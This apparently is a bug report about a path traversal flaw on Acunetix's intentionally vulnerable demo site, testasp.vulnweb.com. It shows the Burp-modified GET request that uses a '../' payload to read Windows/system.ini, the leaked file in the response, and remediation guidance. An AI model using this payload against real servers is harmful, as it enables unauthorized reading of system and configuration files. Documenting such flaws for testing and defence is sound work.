# Title: Path Traversal VUlnerability In About Section of testasp.vulnweb.com
        
# Summary:

About section of vulnweb website http://testasp.vulnweb.com/ has a critical vulnerabilty that is Path traversal vulnerability - 

   A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control.
   
Attack: ../../../../../../../../../../../../../../../../Windows/system.ini
Evidence: [drivers]
   
   
# Steps To Reproduce:
   
   1) Go to the website and click on about section and open burpsuite to change the request. And change this parameter "html/about.html" to the given payload in Get:
          
          ../../../../../../../../../../../../../../../../Windows/system.ini
         
		![Screenshot_2022-03-09_16_22_01](https://user-images.githubusercontent.com/101261654/157542020-c9f38eea-bdd1-4436-bafd-833ac3fa5cec.png)

   From this: 
   
    GET /Templatize.asp?item=html/about.html HTTP/1.1
    Host: testasp.vulnweb.com
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Referer: http://testasp.vulnweb.com/
    Cookie: ASPSESSIONIDASRBTARC=CPFKNNHABGALGKCHKBBNIGCO
    Upgrade-Insecure-Requests: 1
![Screenshot_2022-03-09_16_22_32](https://user-images.githubusercontent.com/101261654/157542206-7bdbfb51-1405-40c7-8ab5-229053aab8e9.png)

To this:

    GET /Templatize.asp?item=../../../../../../../../../../../../../../../../Windows/system.ini HTTP/1.1
    Host: testasp.vulnweb.com
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Referer: http://testasp.vulnweb.com/
    Cookie: ASPSESSIONIDASRBTARC=CPFKNNHABGALGKCHKBBNIGCO
    Upgrade-Insecure-Requests: 1
	
![Screenshot_2022-03-09_16_22_49](https://user-images.githubusercontent.com/101261654/157542291-3abec5ae-4c01-4dd0-9f3b-d978c8ac6623.png)


   2) Then go to http history under proxy and find the request which we changed and see the response you'll find the drivers in it.
  
![Screenshot_2022-03-09_16_23_17](https://user-images.githubusercontent.com/101261654/157542458-3f423c82-3f27-4b04-8cf8-9917898c69d9.png)

![Screenshot_2022-03-09_16_23_25](https://user-images.githubusercontent.com/101261654/157542478-9c14866a-3c11-472a-b289-f115a6ae33a3.png)

   4) Here is the Raw Code of Response:
   	
	
    HTTP/1.1 200 OK

	Cache-Control: private

	Content-Type: text/html

	Server: Microsoft-IIS/8.5

	X-Powered-By: ASP.NET

	Date: Wed, 09 Mar 2022 20:28:42 GMT

	Connection: close

	Content-Length: 3112





	<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

	<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->

	<head>

	<!-- InstanceBeginEditable name="doctitle" -->

	<title>Untitled Document</title>

	<!-- InstanceEndEditable -->

	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

	<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->

	<link href="styles.css" rel="stylesheet" type="text/css">

	</head>

	<body> 

	<table width="100%"  border="0" cellpadding="10" cellspacing="0"> 

	  <tr bgcolor="#008F00"> 

		<td width="306px"><a href="https://www.acunetix.com/"><img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></td> 

		<td align="right" valign="middle" bgcolor="#008F00" class="disclaimer">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></td> 

	  </tr> 

	  <tr> 

		<td colspan="2"><div class="menubar"><a href="Templatize.asp?item=html/about.html" class="menu">about</a> - <a href="Default.asp" class="menu">forums</a> - <a href="Search.asp" class="menu">search</a> 

		 - <a href="./Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3D%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FWindows%2Fsystem%2Eini" class="menu">login</a> - <a href="./Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3D%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FWindows%2Fsystem%2Eini" class="menu">register</a> 

		- <a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu">SQL scanner</a> - <a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu">SQL vuln help</a>

		</div></td> 

	  </tr> 

	  <tr> 

		<td colspan="2"><!-- InstanceBeginEditable name="MainContentLeft" -->

			; for 16-bit app support

	[386Enh]

	woafont=dosapp.fon

	EGA80WOA.FON=EGA80WOA.FON

	EGA40WOA.FON=EGA40WOA.FON

	CGA80WOA.FON=CGA80WOA.FON

	CGA40WOA.FON=CGA40WOA.FON



	[drivers]

	wave=mmdrv.dll

	timer=timer.drv



	[mci]



			<!-- InstanceEndEditable --></td> 

	  </tr> 

	  <tr align="right" bgcolor="#FFFFFF"> 

		<td colspan="2" class="footer">Copyright 2019 Acunetix Ltd.</td> 

	  </tr> 

	</table> 

	<div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px">

		<p style="padding-left:20%;padding-right:20%"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>

	</div>

	</body>

<!-- InstanceEnd --></html>


# Impact:

If a web server or web application is vulnerable to directory traversal attack, the attacker can exploit the vulnerability to reach the root directory and access restricted files and directories. Attackers can modify critical files such as programs or libraries, download password files, expose source code of the web application, or execute powerful commands on the web server, which can lead to complete compromise of the web server.


# Solution:

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

For filenames, use stringent allow lists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses, and exclude directory separators such as "/". Use an allow list of allowable file extensions.

Warning: if you attempt to cleanse your data, then do so that the end result is not in the form that can be dangerous. A sanitizing mechanism can remove characters such as '.' and ';' which may be required for some exploits. An attacker can try to fool the sanitizing mechanism into "cleaning" data into a dangerous form. Suppose the attacker injects a '.' inside a filename (e.g. "sensi.tiveFile") and the sanitizing mechanism removes the character resulting in the valid filename, "sensitiveFile". If the input data are now assumed to be safe, then the file may be compromised. 

Inputs should be decoded and canonicalized to the application's current internal representation before being validated. Make sure that your application does not decode the same input twice. Such errors could be used to bypass allow list schemes by introducing dangerous inputs after they have been checked.

Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links.

Run your code using the lowest privileges that are required to accomplish the necessary tasks. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.

When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.

Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.

OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows you to specify restrictions on file operations.

This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.

# Reference:

	http://projects.webappsec.org/Path-Traversal
	http://cwe.mitre.org/data/definitions/22.html


# Alert Tags:

	OWASP_2021_A01	https://owasp.org/Top10/A01_2021-Broken_Access_Control/
	WSTG-v42-ATHZ-01	https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/01-	Testing_Directory_Traversal_File_Include
	OWASP_2017_A05	https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html




https://user-images.githubusercontent.com/101261654/157547135-58ad98a2-2301-44df-ba75-72120fa132f7.mp4


